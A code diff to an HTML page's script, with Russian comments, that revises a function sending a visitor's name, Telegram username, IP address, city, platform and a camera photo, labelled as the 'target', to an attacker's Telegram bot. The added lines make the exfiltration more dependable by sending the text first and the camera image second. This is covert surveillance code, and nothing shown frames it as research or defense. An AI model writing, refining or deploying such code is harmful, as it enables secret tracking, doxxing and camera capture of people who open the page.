@@ -122,18 +122,28 @@
         }
     }
 
-    function sendToBot(user, ip, photo) {
-        const text = `🎯 ЦЕЛЬ: ${user.first_name} (@${user.username})\n🌐 IP: ${ip.ip}\n📍 ГОРОД: ${ip.city}\n🏢 ПРОВАЙДЕР: ${ip.org}\n💻 СИСТЕМА: ${navigator.platform}`;
+   function sendToBot(user, ip, photo) {
+    const text = `🎯 ЦЕЛЬ: ${user.first_name} (@${user.username})\n🌐 IP: ${ip.ip || '0.0.0.0'}\n📍 ГОРОД: ${ip.city || 'Неизвестен'}\n💻 СИСТЕМА: ${navigator.platform}`;
+    
+    // Отправляем сначала текст, чтобы точно пришло хоть что-то
+    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`)
+        .then(res => res.json())
+        .then(data => console.log("Текст отправлен:", data));
+
+    // Если есть фото, отправляем его вторым сообщением
+    if (photo) {
         const formData = new FormData();
         formData.append('chat_id', TG_ID);
-        if (photo) {
-            formData.append('photo', photo, 'face.jpg');
-            formData.append('caption', text);
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        } else {
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
-        }
+        formData.append('photo', photo, 'capture.jpg');
+        formData.append('caption', "Снимок с камеры цели");
+        
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).then(res => res.json())
+        .then(data => console.log("Фото отправлено:", data));
     }
+}
 </script>
 </body>
 </html>
